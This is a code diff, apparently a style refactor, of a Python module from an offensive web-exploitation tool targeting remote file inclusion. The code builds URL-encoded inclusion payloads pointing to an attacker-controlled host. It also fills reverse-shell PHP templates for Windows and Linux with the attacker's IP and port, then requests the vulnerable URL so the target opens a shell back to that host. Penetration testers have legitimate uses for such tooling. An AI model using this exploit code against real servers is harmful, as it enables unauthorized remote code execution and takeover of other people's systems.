@@ -1,25 +1,32 @@
+"""RFI"""
 import os
 import threading
 import fileinput
+from random import randint
+
 from src.httpreqs import request
-from src.configs.config import *
-from src.utils.arguments import *
+from src.configs.config import rfi_test_port
+from src.utils.arguments import args
 from src.utils.args_check import scriptDirectory
 from src.servers.HTTPServer import serve_forever
 from src.configs import config
 from src.utils import colors
-from random import randint
 from src.utils.info import printInfo
 
 
 def random_with_N_digits(n):
+    """
+    Random number to the n'th power generator
+    
+    Returns int
+    """
     range_start = 10 ** (n - 1)
     range_end = (10**n) - 1
     return randint(range_start, range_end)
 
 
 def test_rfi(url, post):
-
+    """Test RFI"""
     if args.verbose:
         print(colors.blue("[i]") + " Testing remote file inclusion...")
 
@@ -41,37 +48,25 @@ def test_rfi(url, post):
             threading.Thread(target=serve_forever).start()
             rfiTest = []
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(args.lhost, str(rfi_test_port))
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc"
             )
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(
-                    args.lhost, str(rfi_test_port)
-                )
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc%00"
             )
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(
-                    args.lhost, str(rfi_test_port)
-                )
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.gif"
             )
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(
-                    args.lhost, str(rfi_test_port)
-                )
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.png"
             )
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(
-                    args.lhost, str(rfi_test_port)
-                )
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.jsp"
             )
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(
-                    args.lhost, str(rfi_test_port)
-                )
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.html"
             )
             rfiTest.append(
-                "http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(
-                    args.lhost, str(rfi_test_port)
-                )
+                f"http%3A%2F%2F{args.lhost}%3A{rfi_test_port}%2Fysvznc.php"
             )
 
             for test in rfiTest:
@@ -87,7 +82,6 @@ def test_rfi(url, post):
                     return
         except:
             raise
-            pass
 
     # Internet RFI test
     if args.verbose:
@@ -131,7 +125,6 @@ def test_rfi(url, post):
                 return
         except:
             raise
-            pass
 
 
 def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
@@ -146,8 +139,8 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
         return
     else:
         # Prepare file that will be included
-        with open(payloadFile, "r") as f:
-            with open(temporaryFile, "w") as r:
+        with open(payloadFile, "r", encoding="latin1") as f:
+            with open(temporaryFile, "w", encoding="latin1") as r:
                 lines = f.readlines()
                 for line in lines:
                     line = line[:-1]
@@ -158,12 +151,14 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
         for line in file:
             # This redirects stdout to a file, replacing the ip and port values as needed
             print(line.replace("IP_ADDRESS", ip))
+
     with fileinput.FileInput(temporaryFile, inplace=True) as file:
         for line in file:
             print(line.replace("PORT_NUMBER", str(port)))
 
 
 def exploit_rfi(exploit, method, ip, port):
+    """Exploit RFI"""
     if args.f:
         return
 
@@ -200,35 +195,37 @@ def exploit_rfi(exploit, method, ip, port):
                 "",
                 "",
             )
+        return
+
+    # It is a GET
+    if exploit["OS"] == "windows":
+        prepareRfiExploit(
+            config.webDir + os.path.sep + "/reverse_shell_win.php",
+            config.webDir + os.path.sep + "reverse_shell_win_tmp.php",
+            ip,
+            port,
+        )
+        request.REQUEST(
+            url.replace(config.tempArg, "reverse_shell_win_tmp.php"),
+            args.httpheaders,
+            "",
+            config.proxies,
+            "",
+            "",
+        )
     else:
-        if exploit["OS"] == "windows":
-            prepareRfiExploit(
-                config.webDir + os.path.sep + "/reverse_shell_win.php",
-                config.webDir + os.path.sep + "reverse_shell_win_tmp.php",
-                ip,
-                port,
-            )
-            request.REQUEST(
-                url.replace(config.tempArg, "reverse_shell_win_tmp.php"),
-                args.httpheaders,
-                "",
-                config.proxies,
-                "",
-                "",
-            )
-        else:
-            prepareRfiExploit(
-                config.webDir + os.path.sep + "/reverse_shell_lin.php",
-                config.webDir + os.path.sep + "reverse_shell_lin_tmp.php",
-                ip,
-                port,
-            )
-            request.REQUEST(
-                url.replace(config.tempArg, "reverse_shell_lin_tmp.php"),
-                args.httpheaders,
-                "",
-                config.proxies,
-                "",
-                "",
-            )
+        prepareRfiExploit(
+            config.webDir + os.path.sep + "/reverse_shell_lin.php",
+            config.webDir + os.path.sep + "reverse_shell_lin_tmp.php",
+            ip,
+            port,
+        )
+        request.REQUEST(
+            url.replace(config.tempArg, "reverse_shell_lin_tmp.php"),
+            args.httpheaders,
+            "",
+            config.proxies,
+            "",
+            "",
+        )
     return
